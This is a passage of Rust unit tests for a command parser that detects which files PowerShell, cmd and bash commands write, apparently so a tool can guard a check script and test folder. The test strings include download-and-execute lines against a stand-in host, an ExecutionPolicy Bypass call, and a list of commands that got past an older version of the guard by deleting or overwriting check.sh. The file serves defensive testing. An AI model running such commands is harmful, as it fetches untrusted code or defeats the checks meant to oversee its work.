            ["tests/check.sh", "tests/old.sh"]
        );
        assert_eq!(
            writes("mv -Path a.sh check.sh"),
            ["a.sh", "check.sh", "check.sh/a.sh"]
        );
        assert_eq!(
            writes("Rename-Item tests\\check.sh old.sh"),
            ["tests/check.sh", "tests/old.sh"]
        );
        assert_eq!(
            writes("New-Item -ItemType File -Path tests -Name check.sh -Force"),
            ["tests/check.sh"]
        );
        assert_eq!(writes("ni flot.toml"), ["flot.toml"]);
        assert_eq!(writes("$r = Remove-Item check.sh"), ["check.sh"]);
        assert_eq!(
            writes("iwr https://x.example -OutFile check.sh"),
            ["check.sh"]
        );
        assert_eq!(
            writes(
                "Get-ChildItem *.sh | ForEach-Object { Remove-Item $_ }; Clear-Content flot.toml"
            ),
            ["flot.toml"]
        );
        assert_eq!(
            writes("[System.IO.File]::WriteAllText('check.sh', 'exit 0')"),
            ["check.sh"]
        );
        assert_eq!(
            writes("[IO.File]::Copy(\"a.sh\", \"check.sh\", $true)"),
            ["check.sh"]
        );
        // Native programs read as the shell reader reads them.
        assert_eq!(writes("git checkout -- check.sh; cd x"), ["check.sh"]);
        assert_eq!(
            writes("& sed.exe -i 's/1/0/' check.sh"),
            ["s/1/0/", "check.sh"]
        );
    }

    #[test]
    fn reading_variables_and_data_name_nothing() {
        for command in [
            "Get-Content check.sh",
            "Select-String -Path check.sh -Pattern exit",
            "Set-Content $p 'x'",
            "Set-Content Env:FOO bar",
            "Set-Content -Path ($root + 'x') y",
            "Get-Item check.sh | Select-Object Name",
            "# Remove-Item check.sh",
            "<# Remove-Item check.sh #> Get-Date",
            "Get-Date # > check.sh",
            "Write-Output 'Remove-Item check.sh'",
            "cargo test --quiet 2>&1 | Out-String",
        ] {
            let reading = read(command);
            assert_eq!(reading.writes, Vec::<String>::new(), "{command}");
            assert_eq!(reading.remote_code, None, "{command}");
        }
    }

    #[test]
    fn a_here_string_is_data() {
        let command = "$js = @'\nRemove-Item check.sh\n'@\nnode -e $js > out.txt";
        assert_eq!(writes(command), ["out.txt"]);
        let command = "Set-Content check.sh @\"\nexit 0\n\"@";
        assert_eq!(writes(command), ["check.sh"]);
    }

    #[test]
    fn downloaded_code_handed_to_invoke_expression() {
        let cases = [
            ("irm https://x.example/i.ps1 | iex", Some("irm | iex")),
            (
                "iex (iwr -UseBasicParsing x.example).Content",
                Some("iwr | iex"),
            ),
            (
                "Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://x'))",
                Some("downloadstring | invoke-expression"),
            ),
            (
                "& ([scriptblock]::Create((irm x)))",
                Some("irm | [scriptblock]::create"),
            ),
            ("irm x -OutFile i.ps1", None),
            ("iex 'Get-Date'", None),
            ("Write-Output 'irm x | iex'", None),
        ];
        for (command, expected) in cases {
            assert_eq!(read(command).remote_code.as_deref(), expected, "{command}");
        }
    }

    /// Commands measured as allowed by flot 0.2.6, each with a path it
    /// must name.
    const WRITERS: &[(&str, &str)] = &[
        (
            "Remove-Item -ErrorAction SilentlyContinue check.sh",
            "check.sh",
        ),
        ("Remove-Item -ea 0 check.sh", "check.sh"),
        (
            "Set-Content -ErrorAction Stop check.sh 'exit 0'",
            "check.sh",
        ),
        (
            "Set-Content -WarningAction:Ignore -OutVariable o check.sh x",
            "check.sh",
        ),
        ("Remove-Item -Frobnicate x check.sh", "check.sh"),
        ("Remove-Item -Verbose -WhatIf check.sh", "check.sh"),
        ("'check.sh' | Remove-Item", "check.sh"),
        ("'a.sh', 'check.sh' | Remove-Item -Force", "check.sh"),
        ("Get-ChildItem tests | Remove-Item -Recurse", "tests"),
        ("cmd /c del check.sh", "check.sh"),
        ("cmd.exe /s /c \"del /q check.sh\"", "check.sh"),
        ("cmd /c \"echo exit 0 > check.sh\"", "check.sh"),
        ("cmd /c \"copy /y x.sh check.sh\"", "check.sh"),
        ("cmd /c \"ren check.sh old.sh\"", "check.sh"),
        ("cmd /c \"rd /s /q tests\"", "tests"),
        ("cmd /c \"copy C:\\tmp\\fake tests\\\"", "tests/"),
        ("cmd /c \"xcopy /e /y C:\\tmp\\fake tests\\\"", "tests/"),
        ("cmd /c robocopy C:\\tmp\\fake tests /mir", "tests"),
        ("cmd /c \"cd x & git checkout -- check.sh\"", "check.sh"),
        ("powershell -Command \"Remove-Item check.sh\"", "check.sh"),
        (
            "pwsh -NoProfile -ExecutionPolicy Bypass -c 'Set-Content check.sh x'",
            "check.sh",
        ),
        ("powershell.exe \"Remove-Item check.sh\"", "check.sh"),
        ("iex \"Remove-Item check.sh\"", "check.sh"),
        (
            "Invoke-Expression -Command 'Remove-Item check.sh'",
            "check.sh",
        ),
        ("[IO.File]::OpenWrite('check.sh')", "check.sh"),
        ("[IO.StreamWriter]::new('check.sh')", "check.sh"),
        (
            "[System.IO.File]::AppendAllText('check.sh', 'x')",
            "check.sh",
        ),
        ("[IO.File]::Open('check.sh', 'Create')", "check.sh"),
        (
            "[IO.File]::Open('check.sh', [IO.FileMode]::Open)",
            "check.sh",
        ),
        (
            "[IO.FileStream]::new('check.sh', 'Truncate', 'Write')",
            "check.sh",
        ),
        (
            "[IO.File]::SetLastWriteTime('check.sh', (Get-Date))",
            "check.sh",
        ),
        (
            "[IO.File]::WriteAllText(\"$PWD\\check.sh\", 'x')",
            "$PWD/check.sh",
        ),
        ("Set-Content FileSystem::check.sh 'exit 0'", "check.sh"),
        (
            "Set-Content Microsoft.PowerShell.Core\\FileSystem::check.sh x",
            "check.sh",
        ),
        ("curl.exe -o check.sh https://x.example/p", "check.sh"),
        ("bash -c 'rm check.sh'", "check.sh"),
        ("Clear-Item check.sh", "check.sh"),
        ("Clear-Content check.sh", "check.sh"),
        ("'x' | Out-File check.sh", "check.sh"),
        ("Add-Content check.sh x", "check.sh"),
        ("New-Item -Force check.sh", "check.sh"),
        ("Set-Content *.sh x", "*.sh"),
        ("Remove-Item -Recurse tests", "tests"),
    ];

    #[test]
    fn common_parameters_take_their_values() {
        assert_eq!(
            writes("Remove-Item -ErrorAction SilentlyContinue check.sh"),
            ["check.sh"]
        );
        assert_eq!(
            writes("Remove-Item -ea 0 -WarningVariable w check.sh"),
            ["check.sh"]
        );
        assert_eq!(
            writes("Set-Content -OutVariable o check.sh x"),
            ["check.sh"]
        );
        // Not known, the parameter may take the path or a value.
        assert_eq!(
            writes("Remove-Item -Frobnicate x check.sh"),
            ["x", "check.sh"]
        );
    }

    #[test]
    fn the_probe_commands_name_what_they_write() {
        let missed: Vec<String> = WRITERS
            .iter()
            .filter_map(|(command, path)| {
                let found = writes(command);
                (!found.iter().any(|written| written == path))
                    .then(|| format!("{command:?} names {found:?}, not {path:?}"))
            })
            .collect();
        assert!(missed.is_empty(), "{}", missed.join("\n"));
    }

    #[test]
    fn reading_commands_do_not_name_what_they_read() {
        let named: Vec<String> = [
            "Get-Content -ErrorAction Stop check.sh",
            "[IO.File]::ReadAllText('check.sh')",
            "[System.IO.File]::Exists('check.sh')",
            "[IO.File]::Open('check.sh', 'Open', 'Read')",
            "[IO.FileStream]::new('check.sh', [IO.FileMode]::Open, [IO.FileAccess]::Read)",
            "[IO.StreamReader]::new('check.sh')",
            "[IO.Path]::Combine('tests', 'check.sh')",
            "Test-Path check.sh",
            "Get-Item check.sh | Select-Object Name",
            "'check.sh' | Select-String exit",
            "cmd /c type check.sh",
            "cmd /c \"echo check.sh > nul\"",
            "powershell -Command \"Get-Content check.sh\"",
            "pwsh -File check.ps1",
            "iex 'Get-Content check.sh'",
        ]
        .iter()
        .filter_map(|command| {
            let found = writes(command);
            found
                .iter()
                .any(|path| path == "check.sh" || path == "tests" || path.starts_with("tests/"))
                .then(|| format!("{command:?} names {found:?}"))
        })
        .collect();
        assert!(named.is_empty(), "{}", named.join("\n"));
    }
}
